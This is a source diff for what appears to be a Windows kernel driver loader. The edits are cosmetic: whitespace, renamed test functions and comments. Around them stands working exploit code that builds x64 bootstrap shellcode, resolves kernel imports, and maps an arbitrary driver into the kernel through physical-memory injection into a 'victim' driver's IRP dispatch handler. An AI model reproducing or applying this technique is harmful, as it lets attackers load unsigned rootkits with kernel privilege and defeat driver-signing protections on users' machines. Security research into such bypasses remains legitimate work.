@@ -26,7 +26,7 @@
 
 #define SCM_DB_KEY  L"\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Services\\"
 
-typedef ULONG (NTAPI *pfnDbgPrint)(
+typedef ULONG(NTAPI *pfnDbgPrint)(
     _In_ PCHAR Format,
     ...);
 
@@ -62,16 +62,9 @@ typedef NTSTATUS(NTAPI *pfnZwQueryValueKey)(
     _In_      ULONG                       Length,
     _Out_     PULONG                      ResultLength);
 
-typedef VOID (NTAPI *pfnIofCompleteRequest)(
+typedef VOID(NTAPI *pfnIofCompleteRequest)(
     _In_ VOID  *Irp,
     _In_ CCHAR PriorityBoost);
-
-typedef NTSTATUS(NTAPI * pfnDevioctlDispatch)(
-    _In_ struct _DEVICE_OBJECT *DeviceObject,
-    _Inout_ struct _IRP *Irp,
-    _In_ PVOID Data);
-
-typedef NTSTATUS(NTAPI *PfnDriverEntry)();
 
 typedef struct _FUNC_TABLE {
     pfnExAllocatePool ExAllocatePool;
@@ -128,7 +121,7 @@ BOOL VictimLoadUnload(
     _strcat(szKey, Name);
     RtlInitUnicodeString(&str, szKey);
     InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE, 0, 0);
-    
+
     status = NtCreateKey(&hKey, KEY_ALL_ACCESS,
         &obja, 0,
         NULL, REG_OPTION_NON_VOLATILE,
@@ -168,7 +161,7 @@ BOOL VictimLoadUnload(
                             else {
                                 status = NtLoadDriver(&str);
 
-                                if ((status == STATUS_IMAGE_ALREADY_LOADED) || 
+                                if ((status == STATUS_IMAGE_ALREADY_LOADED) ||
                                     (status == STATUS_OBJECT_NAME_COLLISION)) {
 
                                     if (Force) {
@@ -208,7 +201,7 @@ PVOID NTAPI ExAllocatePoolTest(
 {
     PVOID P;
     UNREFERENCED_PARAMETER(PoolType);
-    
+
     P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (P) RtlSecureZeroMemory(P, NumberOfBytes);
 
@@ -237,7 +230,7 @@ VOID NTAPI ExFreePoolTest(
 * User mode test routine.
 */
 VOID IofCompleteRequestTest(
-    _In_ VOID *Irp, 
+    _In_ VOID *Irp,
     _In_ CCHAR PriorityBoost)
 {
     UNREFERENCED_PARAMETER(Irp);
@@ -246,14 +239,14 @@ VOID IofCompleteRequestTest(
 }
 
 /*
-* PsCreateSystemThreadText
+* PsCreateSystemThreadTest
 *
 * Purpose:
 *
 * User mode test routine.
 *
 */
-NTSTATUS NTAPI PsCreateSystemThreadText(
+NTSTATUS NTAPI PsCreateSystemThreadTest(
     _Out_ PHANDLE ThreadHandle,
     _In_ ULONG DesiredAccess,
     _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
@@ -341,7 +334,7 @@ NTSTATUS NTAPI FakeDispatchRoutine(
     LPWORD                          chains;
     DWORD                           c, p, rsz;
 
-    WCHAR                           szRegistryKey[] = { 
+    WCHAR                           szRegistryKey[] = {
         L'\\', L'R', L'E', L'G', L'I', L'S', L'T', L'R', L'Y', L'\\',\
         L'M', L'A', L'C', L'H', L'I', L'N', L'E', 0
     };
@@ -456,7 +449,6 @@ NTSTATUS NTAPI FakeDispatchRoutine(
     ShellCode->Import.IofCompleteRequest(Irp, 0);
     return STATUS_SUCCESS;
 }
-
 
 /*
 * FakeDispatchRoutine2
@@ -642,13 +634,14 @@ VOID SetupShellCode(
         //
         // Build initial code part.
         //
-        // call +5
-        // pop r8
-        // sub r8, 5
-        // jmps +010
-        // int 3
-        // int 3
-        // int 3
+        // 00 call +5
+        // 05 pop r8
+        // 07 sub r8, 5
+        // 0B jmps 10 
+        // 0D int 3
+        // 0E int 3
+        // 0F int 3
+        // 10 code
 
 
         //int 3
@@ -671,7 +664,7 @@ VOID SetupShellCode(
         g_ShellCode->InitCode[0x9] = 0xE8;
         g_ShellCode->InitCode[0xA] = 0x05;
 
-        // jmps +0x10
+        // jmps 
         g_ShellCode->InitCode[0xB] = 0xEB;
         g_ShellCode->InitCode[0xC] = 0x03;
 
@@ -753,7 +746,7 @@ VOID SetupShellCode(
             supPrintText(szMsg);
         }
         g_ShellCode->Import.ZwClose = (pfnZwClose)ConvertedFuncPtr;
-       
+
         //
         // 6. ZwOpenKey
         // 
@@ -785,7 +778,7 @@ VOID SetupShellCode(
         g_ShellCode->Import.ZwQueryValueKey = (pfnZwQueryValueKey)ConvertedFuncPtr;
 
         //
-        // 8. DbgPrint
+        // 8. DbgPrint (unused in Release build)
         // 
         ConvertedFuncPtr = ldrGetProcAddress(KernelBase, KernelImage, "DbgPrint");
         if (ConvertedFuncPtr == 0) {
@@ -799,14 +792,16 @@ VOID SetupShellCode(
         }
         g_ShellCode->Import.DbgPrint = (pfnDbgPrint)ConvertedFuncPtr;
 
-
-        /*g_ShellCode->Import.ZwClose = &NtClose;
+        //
+        // Shellcode test, unused in Release build.
+        //
+       /* g_ShellCode->Import.ZwClose = &NtClose;
         g_ShellCode->Import.ZwOpenKey = &NtOpenKey;
         g_ShellCode->Import.ZwQueryValueKey = &NtQueryValueKey;
         g_ShellCode->Import.ExAllocatePool = &ExAllocatePoolTest;
         g_ShellCode->Import.ExFreePool = &ExFreePoolTest;
         g_ShellCode->Import.IofCompleteRequest = &IofCompleteRequestTest;
-        g_ShellCode->Import.PsCreateSystemThread = &PsCreateSystemThreadText;
+        g_ShellCode->Import.PsCreateSystemThread = &PsCreateSystemThreadTest;
 
         FakeDeviceIoControl(NULL, NULL, g_ShellCode);*/
 
@@ -826,7 +821,7 @@ VOID SetupShellCode(
             //supWriteBufferToFile(L"out.bin", g_ShellCode->BootstrapCode, ProcedureSize);
         }
 
-      //  ((void(*)())g_ShellCode->InitCode)();
+        //((void(*)())g_ShellCode->InitCode)();
 
     } while (bCond);
 
@@ -837,7 +832,7 @@ VOID SetupShellCode(
 *
 * Purpose:
 *
-* Load input file into kernel via shellcode mapped through 
+* Load input file into kernel via shellcode mapped through
 * physical memory injection in victim driver IRP handler.
 *
 */
